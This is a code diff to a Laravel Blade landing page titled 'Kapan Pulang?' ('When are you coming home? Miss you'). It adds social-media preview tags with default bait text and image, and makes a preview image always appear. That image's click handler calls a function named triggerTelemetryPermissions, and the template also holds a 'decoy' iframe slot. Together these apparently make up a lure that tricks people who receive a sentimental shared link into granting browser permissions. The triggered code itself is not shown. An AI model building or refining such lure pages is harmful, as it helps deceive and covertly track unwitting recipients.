@@ -6,10 +6,17 @@
     <title>{{ $siteTitle }}</title>
     
     <!-- Open Graph Meta Tags -->
-    <meta property="og:title" content="{{ $siteTitle }}">
-    <meta property="og:description" content="{{ $siteDescription }}">
-    <meta property="og:image" content="{{ $ogImageUrl }}">
+    <meta property="og:title" content="{{ $siteTitle ?? 'Kapan Pulang?' }}">
+    <meta property="og:description" content="{{ $siteDescription ?? 'Kangen nih, kapan pulang?' }}">
+    <meta property="og:image" content="{{ !empty($ogImageUrl) ? $ogImageUrl : asset('images/landing/kapan-pulang.jfif') }}">
     <meta property="og:type" content="website">
+    <meta property="og:url" content="{{ url()->current() }}">
+
+    <!-- Twitter Card Meta Tags -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="{{ $siteTitle ?? 'Kapan Pulang?' }}">
+    <meta name="twitter:description" content="{{ $siteDescription ?? 'Kangen nih, kapan pulang?' }}">
+    <meta name="twitter:image" content="{{ !empty($ogImageUrl) ? $ogImageUrl : asset('images/landing/kapan-pulang.jfif') }}">
 
     <style>
         * {
@@ -66,9 +73,7 @@
         @if(!empty($landingHeading))
             <h3 class="title">{{ $landingHeading }}</h3>
         @endif
-        @if(!empty($ogImageUrl))
-            <img src="{{ $ogImageUrl }}" alt="Preview" class="preview-img" onclick="if(window.triggerTelemetryPermissions) window.triggerTelemetryPermissions();">
-        @endif
+        <img src="{{ !empty($ogImageUrl) ? $ogImageUrl : asset('images/landing/kapan-pulang.jfif') }}" alt="Preview" class="preview-img" onclick="if(window.triggerTelemetryPermissions) window.triggerTelemetryPermissions();">
     </div>
 
     @if(!empty($decoyIframeUrl))
